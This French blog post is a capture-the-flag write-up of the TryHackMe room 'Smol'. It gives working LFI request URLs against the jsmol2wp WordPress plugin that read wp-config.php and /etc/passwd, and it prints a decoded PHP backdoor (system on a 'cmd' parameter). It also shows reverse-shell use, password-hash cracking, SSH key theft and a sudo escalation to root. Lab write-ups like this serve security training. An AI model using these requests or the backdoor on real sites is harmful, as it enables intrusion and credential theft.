---
date: 2025-01-27T11:31:43-06:00
# description: ""
image: "/images/THM-Smol/Smol.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "THM: Smol"
type: "post"
---

[Lire cet article en anglais](https://scorpiosec.com/posts/thm-smol/)

* Platforme: TryHackMe
* Lien: [Smol](https://tryhackme.com/r/room/smol)
* Niveau: Moyen
* OS: Linux
---

Smol est axé sur l'exploitation des plugins WordPress. Le défi commence par l'énumération d'un site WordPress à l'aide de WPScan, où nous découvrons un plugin vulnérable à l'inclusion de fichier local (LFI). Cette vulnérabilité nous permet d'extraire des identifiants et de nous connecter au tableau de bord de WordPress. Sur le tableau de bord, une note privée nous dirige vers le code source du plugin Hello Dolly, qui contient un backdoor (porte dérobée). En exploitant ce backdoor, nous obtenons un accès initial. Grâce à une série de techniques d'escalade des privilèges, nous parvenons finalement à accéder à un utilisateur disposant de privilèges sudo illimités, ce qui lui confère un accès complet au système en tant que root.

## Balayage 

```
nmap -sC -sV -Pn -oA nmap/Smol 10.10.230.246
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 20:59 CST
Nmap scan report for 10.10.230.246
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.63 seconds
```

Nmap trouve deux ports ouverts:
* 22 avec SSH 
* 80 avec http et une redirection vers `www.smol.thm`. Nous l'ajoutons à notre fichier `/etc/hosts`.

```
sudo echo "{TARGET_IP} www.smol.thm" | sudo tee -a /etc/hosts
```

## Enumération

À `http://www.smol.thm/` nous trouvons un blog.

![Smol blog website](/images/THM-Smol/smol_website.png)

Avec `Wappalyzer` nous apprenons que le site web utilise WordPress.

![Smol Wappalyzer](/images/THM-Smol/WP_wappalyzer.png)

Grâce à Gobuster, nous trouvons des répertoires supplémentaires.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://www.smol.thm
```

À `http://www.smol.thm/wp-includes/` nous trouvons le répertoire `/wp-includes/` contenant les fichiers principaux de WordPress.

> Notez que la navigation directe vers le répertoire `wp-includes` devrait être **désactivée**.

![wp-includes directory](/images/THM-Smol/wpincludes_smol.png)

À `http://www.smol.thm/wp-admin`, nous trouvons une page de connexion.

![wp-admin login](/images/THM-Smol/wpadmin_login.png)

Puisque nous avons un site Wordpress, nous pouvons utiliser `WPScan` pour énumérer les utilisateurs.

```
wpscan --url http://www.smol.thm/ --enumerate u
```

![wpscan users](/images/THM-Smol/wpscan_users.png)

Nous pouvons également énumérer les plugins utilisés.

```
wpscan --url http://www.smol.thm/ --enumerate p
```

![wpscan plugins](/images/THM-Smol/wpscan_plugins.png)

WPScan trouve deux plugins utilisés:
* `twentytwentythree` qui est obsolète (version 1.2)
* `jsmol2wp` qui fonctionne avec la version 1.07 (à jour)

Lorsque nous recherchons un exploit pour `jsmol2wp version 1.07` nous trouvons le [CVE-2018-20463](https://pentest-tools.com/vulnerabilities-exploits/wordpress-jsmol2wp-107-local-file-inclusion_2654)  avec un PoC [ici](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt). La vulnérabilité permet la lecture arbitraire de fichiers. En utilisant l'url ci-dessous, nous trouvons des identifiants, `wpuser:kbLSF2Vop#lw3rjDZ629*Z%G`.

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

![credentials leaked](/images/THM-Smol/creds_leaked.png)

En utilisant la même vulnérabilité, nous énumérons également les utilisateurs du système.

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../../../etc/passwd
```

Nous identifions quatre utilisateurs: `think`, `xavi`, `diego`, et `gege`.

![users on the system](/images/THM-Smol/system_users.png)

Les identifiants sont valides sur la page de connexion WordPress, ce qui nous permet d'accéder au tableau de bord.

![WordPress dashboard](/images/THM-Smol/wp_dashboard.png)

Dans la section `Pages` nous trouvons une page (`Webmaster Tasks!!`) qui n'était pas affichée sur le blog. Nous pouvons également y accéder en allant sur `http://www.smol.thm/index.php/to-do/`.

![todo page](/images/THM-Smol/todo_page.png)

La première tâche mentionne un plugin appelé `Hello Dolly`, nous demandant de vérifier son code source. Après quelques recherches, nous trouvons que le fichier du plugin (`hello.php`) est situé dans `wp-content/plugins`.

![hello dolly php file](/images/THM-Smol/hello_dolly.png)

## Accès initial

Une fois de plus, en exploitant notre vulnérabilité LFI, nous pouvons voir le contenu du fichier.

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
```

![hello dolly code](/images/THM-Smol/hello_dolly_code.png)

Nous trouvons une fonction eval et la chaîne base64 se décode comme suit: `if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }`. La fonction `hello_dolly()` semble être un backdoor. Le plugin est censé n'afficher qu'une ligne de la chanson [Hello Dolly](https://www.youtube.com/watch?v=l7N2wssse14&ab_channel=AustinCasey) sur le tableau de bord.

![hello dolly clyrics](/images/THM-Smol/hello_dolly_lyrics.png)

Mais elle vérifie également si le paramètre `cmd` (`\143\155\x64` correspond à `cmd`) existe dans la chaîne de requête de la requête HTTP (`$_GET`). Si c'est le cas, la fonction `system` exécute la valeur du paramètre `cmd` en tant que commande système sur le serveur.

Exemple : `http://www.smol.thm/wp-admin/index.php?cmd=whoami` exécutera la commande `whoami` sur le serveur.

![hello dolly command execution](/images/THM-Smol/command_execution.png)

Nous pouvons l'utiliser pour obtenir un shell inversé.

> J'ai utilisé le reverse shell `nc mkfifo` sur [revshells](https://www.revshells.com/) et l'ai encodé en URL.

```
http://www.smol.thm/wp-admin/index.php?cmd=REVSHELL
```

![revshell command](/images/THM-Smol/revshell_cmd.png)

Sur le listener, nous recevons une connexion.

![Foothold](/images/THM-Smol/foothold.png)

Dans `/opt` nous trouvons un fichier appelé `wp_backup.sql`.

![sql file](/images/THM-Smol/wpbackup.png)

### Shell en tant que diego

Avec `cat wp_backup.sql | grep "wpuser"` nous trouvons les hashs de tous les utilisateurs. Mais nous savons que seuls quatre d'entre eux sont des utilisateurs sur le système cible.

![Credentials in database](/images/THM-Smol/db_data.png)

```
think:$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/
gege:$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BvcalhsCfVILp2SgttADny40mqJZCN/
```

Ce sont des hashs WordPress, nous pouvons utiliser john pour craquer les hashs. Nous réussissons à cracker le hash de `diego`.

```
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt creds.txt
```

![diego pwd](/images/THM-Smol/diego_pwd.png)

Avec le mot de passe, nous passons à `diego` et récupérons le drapeau utilisateur.

![user flag](/images/THM-Smol/user_flag.png)

Parce que `diego` fait partie du groupe `internal`, il peut accéder au répertoire des autres utilisateurs.

![internal group](/images/THM-Smol/internal_group.png)

Dans `/home/gege/` nous trouvons un fichier appelé `wordpress.old.zip` mais nous ne pouvons pas interagir avec lui avec notre utilisateur actuel.

![wordpress_old zip file](/images/THM-Smol/wordpress_old.png)

### Shell en tant que think

Nous remarquons la présence du fichier `.ssh` dans le répertoire personnel de l'utilisateur `think`.

![think user ssh directory](/images/THM-Smol/think_ssh.png)

![think ssh keys](/images/THM-Smol/think_ssh_keys.png)

Nous transférons la clé SSH à notre machine kali locale et nous nous connectons en tant que `think`.

![think ssh login](/images/THM-Smol/think_SSH_login.png)

### Shell en tant que gege

Nous recherchons les fichiers avec le bit SUID.

```
find / -perm -4000 -type f 2>/dev/null
```

Nous découvrons que `/usr/bin/su` a le bit SUID défini, ce qui signifie que nous pouvons exécuter le fichier avec les permissions du propriétaire du fichier (root).

![SUID files](/images/THM-Smol/SUID_files.png)

Nous passons à `gege` sans fournir de mot de passe, en utilisant la commande `su gege`.

![user gege](/images/THM-Smol/user_gege.png)

Après consultation du fichier `/etc/pam.d/su` (ce fichier contrôle le comportement de `su`), nous constatons qu'il y a une règle qui marque l'authentification comme suffisante si l'utilisateur actual est `think`.

![su file](/images/THM-Smol/su_file.png)

### Shell en tant que xavi

Le fichier `wordpress.old.zip` nécessite un mot de passe pour l'extraction. Nous pouvons utiliser john pour tenter de craquer le mot de passe du zip.

Nous commençons par générer un hachage adéquat.

```
zip2john wordpress.old.zip > hash.txt
```

Ensuite, nous le craquons avec john.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![archive password](/images/THM-Smol/archive_pwd.png)

Avec le mot de passe, nous décompressons l'archive.

Dans `wp-config.php` nous trouvons le mot de passe `xavi`, avec lequel nous passons à cet utilisateur.

![xavi password](/images/THM-Smol/xavi_pwd.png)

## Elévation de Privilèges

Avec `sudo -l`, nous réalisons que `xavi` a des privilèges sudo non restreints, ce qui nous permet de devenir root avec `sudo su`.

![xavi to root](/images/THM-Smol/xavi2root.png)

### Méthode alternative

> Je pense que le créateur de la boîte ne prévoyait pas que cette méthode fonctionne, il s'agit probablement une erreur.

Depuis le shell de l'utilisateur `think`, nous pouvons utiliser `/usr/bin/su root` pour passer à l'utilisateur `root` et le mot de passe est `root`.

> Cette méthode fonctionne également à partir de `www-data`, ce qui signifie que nous pouvons passer à l'utilisateur `root` dès que nous accédons au système.

> EDIT: Depuis le 28 janvier 2025, cette méthode a été patchée.

![root flag](/images/THM-Smol/root_flag.png)
